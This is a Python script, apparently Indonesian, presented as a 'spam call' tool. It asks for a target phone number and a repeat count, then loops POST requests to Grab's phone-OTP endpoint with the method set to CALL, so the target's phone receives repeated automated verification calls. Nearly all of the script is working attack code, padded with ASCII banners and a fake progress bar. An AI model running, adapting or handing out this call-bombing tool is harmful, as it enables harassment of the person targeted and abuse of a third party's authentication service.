import time, itertools, threading, sys, os, requests, random
lr = '\x1b[91m'
lg = '\x1b[92m'
y = '\x1b[93m'
lb = '\x1b[94m'
cy = '\x1b[36m'
x = '\x1b[0m'

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)


print("\x1b[1;36m_____                   _____       _  _      \n|   __| ___  ___  _____ |     | ___ | || | ___ \n|__   || . || .'||     ||   --|| .'|| || ||- _|\n\x1b[1;37m|_____||  _||__,||_|_|_||_____||__,||_||_||___|\n       |_|\n\x1b[1;34m╔═══════════════════════════════════════════════════════════════════╗\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m Author   : Zen Ezz                                             \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m YouTube  : Zen s                                               \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m Facebook : fb.com/zen.clay                                     \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m github   : github.com/zen-clay                                \x1b[1;34m║\n\x1b[1;34m╚═══════════════════════════════════════════════════════════════════╝\n╔═══════════════════════════════════════════════════════════════════╗\n║\x1b[1;36m\x1b[7;32m            TOOLS SPAMZ CALL | UNLIMITED CODED BY ZEN EZ           \x1b[0m║\n\x1b[1;34m╚═══════════════════════════════════════════════════════════════════╝")

def check_internet():
    url = 'http://google.com'
    timeout = 5
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        print(' Koneksi Eror')
        time.sleep(1)
        print('Priksa Kembali Sambungan Internet Anda')
        exit()

    return False


r = '\x1b[1;31m'
g = '\x1b[1;32m'
w = '\x1b[1;37m'
os.system('clear')
print("\x1b[1;36m_____                   _____       _  _      \n|   __| ___  ___  _____ |     | ___ | || | ___ \n|__   || . || .'||     ||   --|| .'|| || ||- _|\n\x1b[1;37m|_____||  _||__,||_|_|_||_____||__,||_||_||___|\n       |_|\n\x1b[1;34m╔═══════════════════════════════════════════════════════════════════╗\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m Author   : Zen Ezz                                             \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m YouTube  : Zen s                                               \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m Facebook : fb.com/zen.clay                                     \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m github   : mgithub.com/zen-clay                                \x1b[1;34m║\n\x1b[1;34m╚═══════════════════════════════════════════════════════════════════╝\n╔═══════════════════════════════════════════════════════════════════╗\n║\x1b[1;36m\x1b[7;32m            TOOLS SPAMZ CALL | UNLIMITED CODED BY ZEN EZ           \x1b[0m║\n\x1b[1;34m╚═══════════════════════════════════════════════════════════════════╝")
mengetik('\x1b[1;36m[\x1b[1;31m!\x1b[1;36m] Masukan Nomor Dengan Awalan 62')
koo = input('\x1b[1;36m[\x1b[1;37m?\x1b[1;36m]\x1b[1;37m Input Target Number =>')
total = int(input(r + '%s\x1b[1;36m[×] Jumlah $=> %s' % (g, w)))
time.sleep(1)
check_internet()
print(y + ' {Tekan Ctrl + C untuk keluar dari program} ' + r)
time.sleep(1)

def updt(total, progress):
    barLength, status = (20, '')
    progress = float(progress) / float(total)
    if progress >= 1.0:
        progress, status = (1, '\r\n')
    block = int(round(barLength * progress))
    text = '\rLoading. [ {} ] {:.0f}% {}'.format('#' * block + '-' * (barLength - block), round(progress * 100, 0), status)
    sys.stdout.write(text)
    sys.stdout.flush()


runs = 100
for run_num in range(runs):
    time.sleep(0.001)
    updt(runs, run_num + 1)

met = {'method':'CALL',  'countryCode':'id',
 'phoneNumber':koo,  'templateID':'pax_android_production'}
try:
    os.system('clear')
    print("\x1b[1;36m_____                   _____       _  _      \n|   __| ___  ___  _____ |     | ___ | || | ___ \n|__   || . || .'||     ||   --|| .'|| || ||- _|\n\x1b[1;37m|_____||  _||__,||_|_|_||_____||__,||_||_||___|\n       |_|\n\x1b[1;34m╔═══════════════════════════════════════════════════════════════════╗\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m Author   : Zen Ezz                                             \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m YouTube  : Zen s                                               \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m Facebook : fb.com/zen.clay                                     \x1b[1;34m║\n\x1b[1;34m║\x1b[1;31m[\x1b[1;37m÷\x1b[1;31m]\x1b[1;37m github   : mgithub.com/zen-clay                                \x1b[1;34m║\n\x1b[1;34m╚═══════════════════════════════════════════════════════════════════╝\n╔═══════════════════════════════════════════════════════════════════╗\n║\x1b[1;36m\x1b[7;32m            TOOLS SPAMZ CALL | UNLIMITED CODED BY ZEN EZ           \x1b[0m║\n\x1b[1;34m╚═══════════════════════════════════════════════════════════════════╝")
    time.sleep(0.9)
    time.sleep(0.9)
    print('\x1b[1;36m[\x1b[1;37m?\x1b[1;36m]\x1b[1;37mTarget Input', koo)
    time.sleep(0.9)
    print('\x1b[1;36m[\x1b[1;37m?\x1b[1;36m]\x1b[1;37m Jumlah spamz', total)
    time.sleep(3)
    print()
    print('\x1b[1;36m[\x1b[1;37m?\x1b[1;36m]\x1b[1;37mStarting Spamz')
    for i in range(total):
        idk = 'challengeID'
        MEM = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=met)
        if str(idk) in str(MEM.text):
            print('\x1b[1;36m[\x1b[1;37m+\x1b[1;36m]\x1b[1;37m Spamz Sukses Terkirim')
        else:
            print('\x1b[1;36m[\x1b[1;37m+\x1b[1;36m]\x1b[1;37m Spamz Gagal Terkirim')
        time.sleep(37)

except KeyboardInterrupt:
    print()
    print('\x1b[1;31m[/033[1;37m!\x1b[1;31m]\x1b[1;37mWrong Input !!!!')
    print('\x1b[1;31m[/033[1;37m!\x1b[1;31m]\x1b[1;37mBy Goblokk !!!')
    exit()
